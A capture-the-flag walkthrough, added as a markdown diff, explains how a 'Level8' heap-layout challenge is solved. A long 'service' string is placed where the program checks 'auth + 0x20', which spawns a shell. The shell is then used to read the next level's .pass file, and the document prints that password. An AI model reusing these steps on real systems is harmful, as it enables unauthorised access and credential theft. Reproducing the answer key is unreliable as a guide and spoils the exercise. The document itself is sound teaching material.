@@ -1,0 +1,122 @@
+# Level8 Walkthrough - Heap Layout Manipulation
+
+## Overview
+Level8 is a heap layout exploitation challenge where we manipulate memory allocation to bypass an authentication check without any buffer overflow.
+
+## Program Behavior
+
+The program is an interactive service that accepts commands:
+
+### Available Commands:
+- `auth [username]` - Allocates memory for authentication
+- `service [name]` - Allocates memory for a service name  
+- `reset` - Frees the auth memory
+- `login` - Attempts to login and get a shell
+
+### Program Flow:
+```
+1. Print current auth and service pointers
+2. Read user input
+3. Parse command and execute
+4. Repeat forever
+```
+
+## The Vulnerability
+
+### The Critical Check:
+```c
+if (*(auth + 0x20)) {  // If there's data 32 bytes after auth pointer
+    system("/bin/sh"); // Give us a shell!
+} else {
+    printf("Password:\n"); // Ask for password (dead end)
+}
+```
+
+### The Problem:
+- `auth` only allocates 4 bytes
+- But the check looks 32 bytes (0x20) beyond the auth pointer
+- We need to put data at that location somehow
+
+## The Attack Strategy
+
+### Memory Layout Understanding:
+```
+Heap grows upward:
+auth pointer     → [4 bytes auth data]
+                   [heap metadata]
+service pointer  → [service string data...]
+```
+
+### The Key Insight:
+If we make the service string long enough (32+ characters), it will be placed in memory such that when the program checks `auth + 0x20`, it will find our service data!
+
+## Step-by-Step Exploit
+
+### Step 1: Allocate Auth
+```bash
+auth 
+```
+- Allocates 4 bytes for auth
+- Program shows: `0x804a008, (nil)`
+
+### Step 2: Allocate Large Service
+```bash
+service AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+```
+- Allocates memory for a 40-character string
+- Program shows: `0x804a008, 0x804a018`
+- The service data overlaps with `auth + 0x20`
+
+### Step 3: Trigger Login
+```bash
+login
+```
+- Program checks `*(auth + 0x20)`
+- Finds our 'A' characters (non-zero)
+- Executes `system("/bin/sh")`
+- We get a shell!
+
+## Memory Layout Visualization
+
+```
+Before service allocation:
+0x804a008: [auth data] [empty space...]
+           ↑
+           auth pointer
+
+After service allocation:
+0x804a008: [auth data] [heap metadata] [AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA]
+           ↑                           ↑
+           auth pointer                auth + 0x20 (contains 'A')
+```
+
+## Why This Works
+
+1. **Heap Allocation Pattern**: malloc() allocates memory sequentially
+2. **Predictable Layout**: Service memory is placed after auth memory
+3. **Offset Calculation**: 32 bytes from auth lands in our service string
+4. **Logic Bypass**: Non-zero data at `auth + 0x20` satisfies the condition
+
+## Complete Exploit
+
+```bash
+/home/user/level8/level8
+auth 
+service AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+login
+# You now have a shell as level9!
+cat /home/user/level9/.pass
+```
+
+## Result
+
+**Level9 Password:** `c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a`
+
+## Key Concepts
+
+- **Heap Layout Manipulation**: Understanding how malloc places memory
+- **Logic Flaw Exploitation**: Bypassing checks through memory layout
+- **No Buffer Overflow**: This exploit doesn't corrupt memory, just arranges it cleverly
+- **Pointer Arithmetic**: Understanding how `auth + 0x20` works in memory
+
+This challenge demonstrates that not all exploits require buffer overflows - sometimes understanding memory layout and program logic is enough to bypass security checks.
